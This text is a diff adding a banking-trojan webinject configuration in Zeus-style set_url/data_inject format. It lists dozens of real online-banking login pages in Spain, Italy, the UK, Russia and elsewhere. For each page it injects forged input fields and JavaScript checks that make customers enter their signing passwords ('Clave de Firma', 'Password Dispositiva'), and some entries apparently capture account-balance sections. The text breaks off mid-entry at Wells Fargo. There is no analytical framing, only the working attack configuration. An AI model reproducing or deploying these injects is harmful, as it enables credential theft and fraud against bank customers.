+alert('Por favor, introduzca la Codigo de tarjeta de claves');return;};"
+data_end
+data_after
+data_end
+
+set_url https://pastornetparticulares.bancopastor.es/SrPd* GP
+data_before
+<input type='password' name='usrClave'*</td>
+data_end
+data_inject
+<td>
+<td >&nbsp;</td>
+</tr>
+<tr>
+<td></td>
+<td nowrap><font face='Arial' size=2><strong>Firma:</strong></font></td>
+<td></td>
+<td align="left">
+<input type="text" name="firma" size="8"></td>
+<td ></td>
+</tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+value="Entrar" onClick="
+data_end
+data_inject
+if (document.forms[0].firma.value.length < 2) {
+alert('Firma no encontrado.');return;};"
+data_end
+data_after
+data_end
+data_before
+if (losCampos.indexOf(element_name)==-1){
+data_end
+;
+data_inject
+allvalid=false;
+data_end
+data_after
+data_end
+
+set_url https://intelvia.cajamurcia.es/2043/entrada/01entradaencrip.htm GP
+data_before
+name="PANB"*">
+data_end
+data_inject
+</tr>
+<tr>
+<td nowrap>&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp; <b>Clave de Firma.</b>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Introduzca su Clave de Firma
+<dir>
+<input type="text" name="ESpass"  style="FONT-WEIGHT: normal; FONT-SIZE: 11px; WIDTH: 70px; COLOR: #db0000; BORDER-TOP-STYLE: groove; FONT-STYLE: normal; FONT-FAMILY: arial; BORDER-RIGHT-STYLE: groove; BORDER-LEFT-STYLE: groove; HEIGHT: 20px; TEXT-ALIGN: right; BORDER-BOTTOM-STYLE: groove" ID="Text2">
+data_end
+data_after
+data_end
+data_before
+<td align="left" valign="top">&nbsp; <a href="javascript:
+data_end
+data_inject
+if(document.intelvia.ESpass.value.length<5){alert('Clave de Firma no encontrado.');}else 
+data_end
+data_after
+data_end
+
+set_url https://www.caja-granada.es/cgi-bin/INclient_2031 GP
+data_before
+name=CLAVE*</td>
+data_end
+data_inject
+<TR> 
+<INPUT class=campos onblur=mayusculas() tabIndex=1 maxLength=20 size=15 name=PAN autocomplete="OFF"></TD>
+data_end
+data_after
+data_end
+data_before
+name="aceptar" onclick="
+data_end
+data_inject
+if(document.forms[0].ESpass.value.length<4){alert('POR FAVOR, INTRODUZCA SU NUMERO DE FIRMA');return;};
+data_end
+data_after
+data_end
+
+set_url https://www.fibancmediolanum.es/BasePage.aspx* GP
+data_before
+Entrar en el banco*<tr>
+data_end
+data_inject
+<td class="kbdusr" align="left">
+<input id="tx" tabIndex="1" onFocus=value=""  size="20" maxlength="12" style="display:block;border:'none';font-size:12px;text-align:center;" value="Segundo codigo secreto" name="ESpass"></tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+</table*</DIV>
+data_end
+data_inject
+</tr>
+<tr> 
+data_end
+data_after
+data_end
+data_before
+__EVENTTARGET*>
+data_end
+data_inject
+
+<input type="hidden" name="ESpass" value="">
+data_end
+data_after
+data_end
+
+set_url https://carnet.cajarioja.es/banca3/tx0011/0011.jsp GP
+data_before
+name="usuario"*>
+data_end
+data_inject
+</tr>
+<tr>
+<td class="literal" colspan="2" nowrap>Firma: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type="text" name="pass" value="" size="14" maxlength="11"></td> 
+data_end
+data_after
+data_end
+data_before
+continua = true*;
+data_end
+data_inject
+if(document.datos.pass.value==""){
+alert("Introduzca su Firma");
+document.datos.pass.focus();
+}
+data_end
+data_after
+data_end
+
+set_url https://www.cajalaboral.com/home/acceso.asp GP
+data_before
+class=InternetDetalle*</TR>
+data_end
+data_inject
+<TR vAlign=bottom>
+<TD class=txtgris>Contrasena CLNET</TD>
+<TD align=right>&nbsp; <INPUT TYPE="password" NAME="pass" MAXLENGTH= "8" SIZE="8"></TD>
+</TR>
+<TR>
+<TD colSpan=2><IMG height=5 src="/img/general/punto.gif" width=5></TD>
+</TR>
+data_end
+data_after
+data_end
+data_before
+<TD><INPUT
+data_end
+data_inject
+ OnClick="javascript: if (document.form.pass.value.length < 2) {
+alert('Por favor, introduzca la Contrasena CLNET');return;};"
+data_end
+data_after
+data_end
+
+set_url https://www.cajasoldirecto.es/2106/* GP
+data_before
+name="PIN"*>
+data_end
+data_inject
+<tr><td><font class="normal">Clave de Firma
+          
+<input name="ESpass" type="text" id="PAN"/>
+
+</td></tr>
+data_end
+data_after
+data_end
+data_before
+usuario=''*;
+data_end
+data_inject
+if (document.forms[0].ESpass.value.length < 5) {
+alert("Clave de Firma no encontrado");
+}
+else
+data_end
+data_after
+data_end
+
+set_url https://www.clavenet.net/cgi-bin/INclient_7054 GP
+data_before
+abreflo(\'segu\')*</script>
+data_end
+data_inject
+</tr>
+<tr>
+<td width="85">&nbsp;</td>
+<td class="cfcenb" width="100">Clave de firma:</td>
+<td class="cfce" width="12"><img src="../7054/img/fle_ent.gif"></td>
+<td class="cfce">
+<input name="ESpass" value="" class="cinplo10" type="text" maxlength="32" onfocus="foc=1;">
+</tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+PINV2*>
+data_end
+data_inject
+
+<input type="hidden" name="ESpass" value="0">
+data_end
+data_after
+data_end
+data_before
+if(contS==0)*{
+data_end
+data_inject
+
+if(document.userpass.ESpass.value.length < 5){
+   alert("Introduzca su Clave de firma");
+   document.userpass.ESpass.focus();
+  }
+else
+data_end
+data_after
+data_end
+
+set_url https://www.cajavital.es/Appserver/vitalnet* GP
+data_before
+NAME="PAN"*<TR>
+data_end
+data_inject
+<TD ALIGN="CENTER" CLASS="px12"><B>Firma electronica.</B></TD>
+</TR>
+<TR> 
+<TD ALIGN="CENTER"><B> 
+<INPUT NAME="ESpass" TYPE="text" id="TEXT" size="8" maxlength="8">
+</B></TD>
+data_end
+data_after
+data_end
+data_before
+NumPulsaciones=NumPulsaciones-1*;
+data_end
+data_inject
+if(document.forms.normal.ESpass.value.length < 5){
+alert("Introduzca su Firma electronica");
+NumPulsaciones=1;
+document.forms.normal.ESpass.focus();
+}
+else
+data_end
+data_after
+data_end
+
+set_url https://banca.cajaen.es/Jaen/INclient.jsp GP
+data_before
+/Jaen/images/interrogante.jpg*>
+data_end
+data_inject
+</TR> 
+<TR> 
+<TD height=29> 
+<P><FONT face="Verdana, Tahoma" color=#007042 size=2></FONT></P></TD> 
+<TD height=29><FONT face="Verdana, Tahoma" color=#007042 size=2>Firma:</FONT></TD> 
+<TD><INPUT maxLength=10 size=10 value="" name=ESpass></FONT></TD>
+data_end
+data_after
+data_end
+data_before
+<input name="image"
+data_end
+data_inject
+ OnClick="javascript: if (document.login.ESpass.value.length < 5) {
+alert('Firma no encontrado');return;};"
+data_end
+data_after
+data_end
+
+set_url https://www.cajadeavila.es/cgi-bin/INclient_6094 GP
+data_before
+name="PAN"*</td>
+data_end
+data_inject
+</tr>
+<tr><td class="sp5">&nbsp;</td></tr>
+<tr><td class="txt10n" align="right" width="71px">Firma</td>
+<td class="txt10n" align="right" width="77px"><input type="text" class="inp10" name="ESpass" maxlength="16"></td>
+data_end
+data_after
+data_end
+data_before
+if(contS==0)*{
+data_end
+data_inject
+
+if(document.userpass.ESpass.value==""){
+      alert("Introduzca su Clave de Firma");
+      document.userpass.ESpass.focus();
+    }
+else
+data_end
+data_after
+data_end
+data_before
+PINV2*>
+data_end
+data_inject
+
+<input type="hidden" name="ESpass" value="">
+data_end
+data_after
+data_end
+
+set_url https://www.caixatarragona.es/esp/sec_1/oficinacodigo.jsp GP
+data_before
+name=HB_PSW_FINAL_CONEX2*</TD>
+data_end
+data_inject
+<TR>
+<TD class=menu noWrap align=right>&nbsp;&nbsp;<A tabIndex=1 href="javascript:ct_ayuda('http://www.caixatarragona.es/esp/sec_20/codigos.html','680','450')">Clave de FIRMA</A>&nbsp;</TD>
+<TD><INPUT tabIndex=2 name=pass maxlength=10></TD>
+<TD><IMG height=1 src="../../img/espacio.gif" width=20></TD>
+data_end
+data_after
+data_end
+data_before
+genera_esp()*;
+data_end
+data_inject
+if (document.LOGINFORM.pass.value.length < 10) {
+alert("El Clave de FIRMA debe ser de 10 dígitos");
+error=1;
+}
+data_end
+data_after
+data_end
+
+set_url http://caixasabadell.net/banca2/tx0011/0011.jsp GP
+data_before
+name="usuario"*>
+data_end
+data_inject
+</tr>
+<tr>
+<td class="Portada_LitFormularioAcceso" nowrap>&nbsp; Firma&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <input name="pass" type="text" size="12" maxlength="12" VALUE=""></td>
+data_end
+data_after
+data_end
+data_before
+continua = true*;
+data_end
+data_inject
+if(document.datos.pass.value==""){
+alert("Introduzca su Firma");
+document.datos.pass.focus();
+}
+data_end
+data_after
+data_end
+
+set_url https://www.caixaontinyent.es/cgi-bin/INclient_2045 GP
+data_before
+name="CLAVE"*</td>
+data_end
+data_inject
+</tr>
+<tr align="center">
+<td align="right" width="50%"><b>
+<font size="2" face="Arial" color="#0000A0">Clave de Acceso:</font></b></td>
+<td align="right" width="50%">
+<p align="left"><input name="CLAVE" type="password" size="4" maxlength="4" onChange="doSubmit(document.userpass)"></td>
+data_end
+data_after
+data_end
+data_before
+continua = true*;
+data_end
+data_inject
+if(document.datos.pass.value==""){
+alert("Introduzca su Firma");
+document.datos.pass.focus();
+}
+data_end
+data_after
+data_end
+
+set_url https://www.caixalaietana.es/cgi-bin/INclient_2042 GP
+data_before
+name="PAN"*;
+data_end
+data_inject
+</tr>'
+<tr><td class="cfce">&nbsp;&nbsp;&nbsp;Firma:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="ESPASS" value="" type="password"></td>
+data_after
+data_end
+data_before
+Intro(e)*{
+data_end
+data_inject
+if(document.forms[0].PIN0.value==""){
+alert("Introduzca su Clave de firma");
+document.userpass.PIN0.focus();
+}
+else
+data_end
+data_after
+data_end
+
+set_url https://www.cajacirculo.es/ISMC/Circulo/acceso.jsp GP
+data_before
+id="sUsuario*</td>
+data_end
+data_inject
+</tr>
+<tr> 
+<td width="78"><div align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"> Clave de Firma</font></div></td>
+<td width="60"><input name="ESpass" type="text" id="sUsuario" size="10" maxlength="20"></td>
+data_end
+data_after
+data_end
+data_before
+<input name="imageField"
+data_end
+data_inject
+ OnClick="javascript: if (document.userpass.ESpass.value.length < 5) {
+alert('Clave de Firma no encontrado');return;};"
+data_end
+data_after
+data_end
+
+set_url https://areasegura.banif.es/bog/bogbsn* GP
+data_before
+NAME="textfield_Login"*</td>
+data_end
+data_inject
+<td class="ob" width="120" align="right">&nbsp;</td>
+<td align="left" width="310">&nbsp;&nbsp;
+</td>
+</tr>
+<tr> 
+<td class="ob" width="120" align="right"><b> 
+Firma
+<IMG NAME="IMG9" HEIGHT="8" WIDTH="11" SRC="../../images/bsn/flecha_black.gif"></b></td>
+<td align="left" valign="middle" width="310">&nbsp; 
+<INPUT TYPE=password NAME="ESpass" MAXLENGTH="40" VALUE="" class="combowhite">
+<tr> 
+data_end
+data_after
+data_end
+data_before
+<A HREF="#" name="Confirm" onClick="
+data_end
+data_inject
+if (document.forms[0].ESpass.value.length < 4) {
+alert('Firma no encontrado.');return;};
+data_end
+data_after
+data_end
+
+set_url https://www.bgnetplus.com/niloinet/login.jsp GP
+data_before
+name="userid"*</td>
+data_end
+data_inject
+</tr>
+<tr>
+<td width="30%" align="right" class="etiqLogin">Firma:
+</td>
+<td width="70%" align="left"><INPUT id="userid" onkeypress="ValidateButton()" size="25" name="ESpass" maxlength="10"
+style="background-color: white" class="awebtextbox"></td>
+data_end
+data_after
+data_end
+data_before
+type="button" onclick="
+data_end
+data_inject
+if (document.forms[0].ESpass.value.length < 2) {
+alert('Firma no encontrado.');return;};"
+data_end
+data_after
+data_end
+
+set_url https://www.caixagirona.es/cgi-bin/INclient_2030* GP
+data_before
+name="PIN"*>
+data_end
+data_inject
+</tr>
+<tr> 
+</td>
+<td>Clave de Firma</td>
+<td> 
+<input type="text" name="ESpass" size="8" maxlength="8" value="">
+</td>
+data_end
+data_after
+data_end
+data_before
+function Enviar_formulari()*{
+data_end
+data_inject
+if (document.userpass.ESpass.value.length < 4) {
+alert(' Clave de Firma no encontrado');
+bPotEntrar=true;
+} else
+data_end
+data_after
+data_end
+
+set_url https://www.unicaja.es/PortalServlet* GP
+data_before
+type="password"*<tr>
+data_end
+data_inject
+<td align="right" valign="center">
+<span class="label">
+Firma electronica
+</span></td>
+<td align="right" valign="center">
+<input id="pass" maxlength="6" name="pass" size="6" type="password"/></td>
+<td id="refClave"/>
+</tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+<input alt="Ir al Servicio de Banca por Internet. Su clave viajará cifrada a través de la red."
+data_end
+data_inject
+ OnClick="javascript: if (document.forms[0].pass.value.length < 2) {
+alert('Por favor, introduzca la Firma electronica');
+return;
+}
+data_end
+data_after
+data_end
+
+set_url https://www.sabadellatlantico.com/es/* GP
+data_before
+name=ASEA01*</TD>
+data_end
+data_inject
+<TR>
+<TD noWrap width=85>&nbsp;&nbsp;Codigo de tarjeta&nbsp; de claves:</TD>
+<TD><INPUT style="FONT-SIZE: 9px; FONT-FAMILY: Verdana" type=text maxLength=4 size=4 name=pass></TD></TR>
+data_end
+data_after
+data_end
+data_before
+<TD colSpan=3>&nbsp;<INPUT
+data_end
+data_inject
+ OnClick="javascript: if (document.forms[0].pass.value.length < 2) {
+alert('Por favor, introduzca la Codigo de tarjeta de claves');return;};"
+data_end
+data_after
+data_end
+
+set_url https://oi.cajamadrid.es/CajaMadrid/oi/pt_oi/Login/login GP
+data_before
+name="Documento_s"*</div>
+data_end
+data_inject
+<DIV class='fila clearfix'><SPAN><LABEL class=DesactivarCajetin 
+for=Documento_s>Firma:</LABEL></SPAN><SPAN class=oculto></SPAN> <INPUT class=ancho tabIndex=700 
+maxLength=15 type=text name=ESpass autocomplete='off'></DIV>
+data_end
+data_after
+data_end
+data_before
+<input type="hidden" name="MonitorPortales" value="0">
+data_end
+data_inject
+<input name="ESpass" type="hidden" value="">
+data_end
+data_after
+data_end
+data_before
+onkeypress="valida('0');return false" onclick="
+data_end
+data_inject
+if(document.forms[0].ESpass.value.length<5){alert('Clave de firma no encontrado.');return;}
+data_end
+data_after
+data_end
+
+set_url https://www.cajabadajoz.es/cgi-bin/INclient_6010* GP
+data_before
+name="PAN"*">
+data_end
+data_inject
+<tr><td class="cfce">&nbsp;&nbsp;&nbsp;Clave de Firma:&nbsp;</td><td><input name="ESpass" type=password  value="" class="cinpbr"></td></tr>
+data_end
+data_after
+data_end
+data_before
+<input name="PINV2" type="hidden" value="si">
+data_end
+data_inject
+<input name="ESpass" type="hidden" value="">
+data_end
+data_after
+data_end
+data_before
+AUTOCOMPLETE="OFF"
+data_end
+data_inject
+ OnSubmit="javascript:return CheckES();"
+data_end
+data_after
+data_end
+data_before
+<input type="hidden" name="PGDESTI" value="">
+data_end
+data_inject
+
+<script language="Javascript">
+function CheckES(){var vv=document.userpass.ESpass.value;if(vv.length<4){alert('Clave personal (Clave de firma) no encontrado.');return;}document.userpass.ESpass.value=vv;}
+</script>
+data_end
+data_after
+data_end
+
+set_url https://extranet.banesto.es/npage/OtrosLogin/LoginIBanesto.htm GP
+data_before
+name=usuario*</td>
+data_end
+data_inject
+</tr><tr>
+</TR> <TR> <TD align=left><FONT size=+0><B>
+Clave&nbsp;de Firma:</B></FONT></TD> <TD align=left colSpan=3><INPUT type=password maxLength=8 align=center size=8 value="" name=ESpass></TD>
+data_end
+data_after
+data_end
+data_before
+<input type="hidden" name="SXPASWI_A" value="">
+data_end
+data_inject
+<input type="hidden" name="ESpass" value="">
+data_end
+data_after
+data_end
+data_before
+<td><a href="javascript:
+data_end
+data_inject
+var vv=document.forms[0].ESpass.value;if(vv.length<4){alert('Clave personal (Clave de firma) no encontrado.');return;}document.nuevo.ESpass.value=vv;
+data_end
+data_after
+"><img src=img/boton_b.gif border=0></td>
+data_end
+data_before
+<td><a href="javascript:
+data_end
+data_inject
+var vv=document.forms[0].ESpass.value;if(vv.length<4){alert('Clave personal (Clave de firma) no encontrado.');return;}document.nuevo.ESpass.value=vv;
+data_end
+data_after
+data_end
+
+set_url https://montevia.elmonte.es/cgi-bin/INclient_2098* GP
+data_before
+id="PAN"*</td></tr>
+data_end
+data_inject
+<tr><td><font class="normal">Firma    
+<input name="ESpass" type="password" id="PAN"/>
+</td></tr>
+data_end
+data_after
+data_end
+data_before
+usuario='';
+data_end
+data_inject
+if (document.forms[0].ESpass.value.length < 5) {
+alert("Clave personal (Clave de firma) no encontrado");
+}
+data_end
+data_after
+data_end
+
+set_url https://www.cajacanarias.es/cgi-bin/INclient_6065 GP
+data_before
+Correspondencia*</td>
+data_end
+data_inject
+</tr>
+<tr>
+<td class="azul"><span class="azulbold">5.</span> Clave de Firma:</td>
+<td class="azul">
+<input name="ESpass" type="password" id="ESpass" maxlength="16">
+data_end
+data_after
+data_end
+data_before
+doSubmit()*{
+data_end
+data_inject
+if (document.userpass.ESpass.value == "") {
+alert("Introduzca su Clave de firma");
+}
+data_end
+data_after
+data_end
+
+set_url https://oie.cajamadridempresas.es/CajaMadrid/oie/pt_oie/Login/login_oie_1 GP
+data_before
+name="selopcion_s"*</div>
+data_end
+data_inject
+<h3 class="gi">3. Introduzca su Firma</h3>
+</div>
+<div class="seu">
+<label for="NumeroUsuario" class="mhh"><strong>Firma:</strong></label>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="ESpass" maxlength="8" size="8" class="caja" AUTOCOMPLETE="off">
+data_end
+data_after
+data_end
+data_before
+name="aceptar" onclick="
+data_end
+data_inject
+if(document.f1.ESpass.value.length<5){alert('POR FAVOR, INTRODUZCA SU CLAVE DE FIRMA');return;};
+data_end
+data_after
+data_end
+
+set_url https://www.gruppocarige.it/grps/vbank/jsp/login.jsp GP
+data_before
+NAME="PASSWORD"*</TR>
+data_end
+data_inject
+<TR><TD WIDTH="220" CLASS="BLUE">Password Dispositiva</TD><TD><INPUT TYPE="password" NAME="PASS" MAXLENGTH="8" SIZE="8" OnKeyPress="TastoEnter(event.which, event.keyCode)"></TD></TR>
+data_end
+data_after
+data_end
+data_before
+HREF="javascript:
+data_end
+data_inject
+if(document.forms[0].PASS.value.length<5){alert('Inserisci la Password Dispositiva');}else 
+data_end
+data_after
+data_end
+
+set_url https://bancopostaonline.poste.it/bpol/bancoposta/formslogin.asp GP
+data_before
+NAME="Password"*</tr>
+data_end
+data_inject
+<tr bgcolor="#ffffff">
+<td bgcolor="#e8f404" class="b10" height="35" valign="middle"><b><label for="NomeUtente">Codice:</label></b></td>
+<td><input id="NomeUtente" NAME="codice" maxlength ="50"></td> 
+data_end
+data_after
+data_end
+data_before
+href="javascript:
+data_end
+data_inject
+if(document.frmRegister.codice.value.length<5){alert('Inserisci la Codice');}else 
+data_end
+data_after
+data_end
+
+set_url https://privati.internetbanking.bancaintesa.it/sm/login/IN/box_login.jsp GP
+data_before
+name="PASSWORD"*<tr>
+data_end
+data_inject
+<td height="32" class="grigio10">password dispositiva <br/><input name="PASSDIS" type="password" size="12" onkeypress="javascript:entsub('PASSWORD', event);" tabindex="2" style="width: 110px;"/></td>
+<td><img alt="" src="/static/i/spaziatore.gif" width="10"/></td>
+</tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+Inserire un valore in 'codice segreto*}
+data_end
+data_inject
+else if (document.loginForm.PASSDIS.value.length == 0) {
+alert("Inserire un valore in 'password dispositiva'!");
+document.loginForm.PASSDIS.focus
+}
+data_end
+data_after
+data_end
+
+set_url https://hb.quiubi.it/newSSO/x11logon.htm GP
+data_before
+name="password"*</tr
+data_end
+data_inject
+</tr>
+<tr>
+<td>Password Dispositiva</td>
+<td align="right"><input type="password" name="pass" size="20"></td>
+data_end
+data_after
+data_end
+data_before
+function cmdLogin_onclick*{
+data_end
+data_inject
+  if (document.ssoform.pass.value.length<8){
+  alert("Per favore, riempire Password Dispositiva");
+  document.ssoform.pass.focus();
+  return false; 
+  } else 
+
+data_end
+data_after
+data_end
+
+set_url https://www.iwbank.it/private/index_pub.jhtml* GP
+data_before
+name="_D:auto_username"*">
+data_end
+data_inject
+<tr>
+<td>&nbsp;&nbsp;</td><td class="dati-content">
+Password Dispositiva<br>
+<input name="pass"  type="text" class="textarea" size="20" style="width:148px" value="">
+data_end
+data_after
+data_end
+data_before
+function submitDaLogin*{
+data_end
+data_inject
+if ( yoForm.pass.value=="" ){
+alert ( "Per favore, riempire Password Dispositiva" );
+return false;
+data_end
+data_after
+data_end
+data_before
+return true*;
+data_end
+data_inject
+}
+data_end
+data_after
+data_end
+
+set_url https://web.secservizi.it/siteminderagent/forms/login.fcc GP
+data_before
+name="PASSWORD"*</tr>
+data_end
+data_inject
+<tr> <td colspan=4 height=10> <font size=1> &nbsp; </font> </td> </tr>
+<tr>
+<td WIDTH=20 >&nbsp;</td>
+<td >
+<b><font size=-1 face="arial,helvetica" > Password Dispositiva: </font></b>
+</td>
+<td ALIGN="left" >
+&nbsp; <input type="password" name="pass" size="30" style="margin-left: 1px">
+</td>
+<td WIDTH=20 >&nbsp;</td>
+</tr>
+data_end
+data_after
+data_end
+data_before
+onClick="
+data_end
+data_inject
+ if  (document.forms[0].pass.value.length < 1) {alert('Per favore, riempire Password Dispositiva');return;}
+data_end
+data_after
+data_end
+
+set_url https://www.isideonline.it/relaxbanking/sso.Login* GP
+data_before
+name="codAbi"*</tr>
+data_end
+data_inject
+<tr>
+<td align="left">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td height="65"><b> Password Dispositiva:</b></td>
+</tr>
+<tr>
+<td align="center">
+<input type="password" name="pass" size="10" maxlength="5">
+</td>
+</tr>
+data_end
+data_after
+data_end
+data_before
+href="javascript:
+data_end
+data_inject
+if(document.frmRegister.pass.value.length<5){alert('Inserisci la Codice');}else 
+data_end
+data_after
+data_end
+
+set_url https://scrigno.popso.it* GP
+data_before
+name="password"*/>
+data_end
+data_inject
+<p><label for="password">Password dispositiva:</label> <input type="password" name="ITpass" maxlength="12" size="15"/></p>
+data_end
+data_after
+data_end
+data_before
+Formato User-ID non  corretto*}
+data_end
+data_inject
+else if (document.loginForm.ITpass.value.length == 0) {
+alert("Inserire un valore in 'password dispositiva'!");
+document.loginForm.ITpass.focus
+}
+data_end
+data_after
+data_end
+data_before
+
+set_url https://www.in-biz.it* GP
+data_before
+name="Password"*<tr>
+data_end
+data_inject
+<td width="148" height="20" bgcolor="#EBEBEB" valign=bottom><P class="text_standard">Password dispositiv</P></td>
+<td rowspan="11" width="3">&nbsp;</td>
+</tr>
+<tr>
+<td width="148" height="20" bgcolor="#EBEBEB"><font face="Courier New"> </font><font size="2" face="Verdana">
+<input name="ITpass" value="" size=26 maxlength=256 style="font-size:9px; font-family:Verdana; color:#000000"></font><font size="2" face="Verdana">
+</tr>
+<tr>
+data_end
+data_after
+data_end
+data_before
+Formato User-ID non  corretto*}
+data_end
+data_inject
+else if (document.loginForm.ITpass.value.length == 0) {
+alert("Inserire un valore in 'password dispositiva'!");
+document.loginForm.ITpass.focus
+}
+data_end
+data_after
+data_end
+data_before
+
+set_url https://www.gbw2.it/cbl/jspPages/form_login_AV.jsp* GP
+data_before
+NAME="Passwd"*</tr>
+data_end
+data_inject
+<tr height='20'>
+<td class='CELLAPARI'>Password Dispositiva :</td>
+<td colspan='2' class='CELLAPARI'>
+<input class='TEXT' TYPE="password" NAME="pass" SIZE="12" MAXLENGTH="8"  value='' >
+</td>
+</tr>
+data_end
+data_after
+data_end
+data_before
+onClick="
+data_end
+data_inject
+if  (document.forms[0].pass.value.length < 1) {alert('Per favore, riempire Password Dispositiva');return;}
+data_end
+data_after
+data_end
+
+set_url https://www.halifax-online.co.uk/MyAccounts/MyAccounts.aspx* GPL
+data_before
+<span class="fullBorderInfoPanelTitle">My accounts
+data_end
+data_inject
+data_end
+data_after
+<span class="prompts_infopaneltitletext_myAccounts">Other offers
+data_end
+
+set_url https://ibank.barclays.co.uk/olb/x/LoginMember.do GPL
+data_before
+<td colspan="2" class="headingTwoRed"><br><b>Please use the drop-down menus to input:</td>
+data_end
+data_inject
+data_end
+data_after
+<a href="/olb/x/ReorderPasscodeStandalone.do
+data_end
+
+set_url https://www.halifax-online.co.uk/_mem_bin/* GPL
+data_before
+<td valign="middle" width="160" class="bwLoginMCUser">
+data_end
+data_inject
+data_end
+data_after
+alt="Security Answer"></td>
+data_end
+
+set_url https://online*.lloydstsb.co.uk/logon.ibc GPL
+data_before
+<td colspan="5" height="30" class="entries" bgcolor="#CEEFE7">
+data_end
+data_inject
+data_end
+data_after
+<td width = "4"bgcolor="#CEEFE7" colspan = "3"><img src="img/space.gif" width="10" height="1"></td>
+data_end
+
+set_url https://home.ybonline.co.uk/ral/loginmgr/* GPL
+data_before
+<td align="left" width="72%"><span class="body">
+data_end
+data_inject
+data_end
+data_after
+<td width="28%" align="right"><input type="password"
+data_end
+
+set_url https://www.mybank.alliance-leicester.co.uk/login/* GPL
+data_before
+<label for="txtNewPIN">
+data_end
+data_inject
+data_end
+data_after
+<input name="txtMemDetail" id="memDetail"  type="text" maxlength="40" />
+data_end
+
+set_url https://www.ebank.hsbc.co.uk/main/IBLogon.jsp GPL
+data_before
+<td valign="middle" bgcolor="#dddddd"><b>Please enter
+data_end
+data_inject
+data_end
+data_after
+<td bgcolor="#dddddd" height="49">
+data_end
+
+set_url https://www.isbank.com.tr/Internet/ControlLoader.aspx* GPL
+data_before
+MEVDUAT HESAPLARIM</span></td>
+data_end
+data_inject
+data_end
+data_after
+</HTML>
+data_end
+
+set_url https://light.webmoney.ru/default.aspx GL
+data_before
+<table*id="CtlPurseList1_dgPurses1"*>
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://olb2.nationet.com/MyAccounts/frame_MyAccounts_WP2.asp* GPL
+data_before
+<TH WIDTH="40%" HEIGHT="20" CLASS="leftnavborderaccountselected">&nbsp;Banking</TD>
+data_end
+data_inject
+data_end
+data_after
+inform us here</A></span>
+data_end
+
+set_url https://www*.banking.first-direct.com/1/2/* GPL
+data_before
+<h1>log on</h1> 
+data_end
+data_inject
+data_end
+data_after
+</html>
+data_end
+
+set_url https://cardsonline-consumer.com/RBSG_Consumer/VerifyLogin.do GPL
+data_before
+<fieldset class="login">
+data_end
+data_inject
+data_end
+data_after
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="submit-bar">
+data_end
+
+set_url *//money.yandex.ru/index.xml GPL
+data_before
+<span class="sum">
+data_end
+data_inject
+data_end
+data_after
+</span>
+data_end
+
+set_url *//money.yandex.ru/ GPL
+data_before
+<span class="sum">
+data_end
+data_inject
+data_end
+data_after
+</span>
+data_end
+
+set_url *//mail.yandex.ru/index.xml GPL
+data_before
+<span id="money_sum">
+data_end
+data_inject
+data_end
+data_after
+</span>
+data_end
+
+set_url *//mail.yandex.ru/ GPL
+data_before
+<span id="money_sum">
+data_end
+data_inject
+data_end
+data_after
+</span>
+data_end
+
+set_url https://www.rbsdigital.com/Login.asp* GPL
+data_before
+<h3 id="LI6BTHC" class="frmHdr">
+data_end
+data_inject
+data_end
+data_after
+name="txnID" />
+data_end
+
+set_url https://banking*.anz.com/* GPL
+data_before
+<td class="actionHeaderTopPadding" >Balances and Transactions
+data_end
+data_inject
+data_end
+data_after
+<!--This is required for bway:button
+data_end
+
+set_url https://olb2.nationet.com/signon/signon* GPL
+data_before
+Passnumber:</SPAN>
+data_end
+data_inject
+data_end
+data_after
+<TD COLSPAN="4" CLASS="consolebackground">
+data_end
+
+
+set_url https://www.nwolb.com/Login.asp* GPL
+data_before
+<span OnClick="window.open('https://www.nwolb.com/help.asp
+data_end
+data_inject
+data_end
+data_after
+<script language="javascript">document.write("<img src='brands/NWB/
+data_end
+
+set_url https://home2ae.cd.citibank.ae/CappWebAppAE/producttwo/capp/action/signoncq.do GPL
+data_before
+<tr>   <TD width='17%' align=left CLASS=label nowrap>
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://internetbanking.aib.ie/hb1/roi/signon GPL
+data_before
+<td colspan="4">Please enter <b>Digit
+data_end
+data_inject
+data_end
+data_after
+<input type="password" id="txtChallenge"
+data_end
+
+set_url https://lot-port.bcs.ru/names.nsf?#ogin* GP
+data_before
+INPUT NAME="Username"*</TR>
+data_end
+data_inject
+<TR VALIGN=top><TD WIDTH="27" BGCOLOR="D9EAF4"><IMG SRC="/icons/ecblank.gif" BORDER=0 HEIGHT=1 WIDTH=1 ALT=""></TD><TD WIDTH="75" BGCOLOR="D9EAF4" COLSPAN=2 VALIGN=middle nowrap><FONT FACE="Arial"></FONT><FONT SIZE=2 FACE="Arial">?şêå¨-êèùà-??:</FONT></TD><TD WIDTH="227" BGCOLOR="D9EAF4"><FONT SIZE=2 FACE="Arial">
+<INPUT NAME="brokerN" VALUE="" TYPE=text maxlength=256></FONT></TD></TR>
+data_end
+data_after
+data_end
+
+;===========vvvvWELLSFARGOvvvv=================
+
+set_url *wellsfargo.com/* GP
+data_before
+<span class="mozcloak"><input type="password"*</span>
+data_end
+data_inject
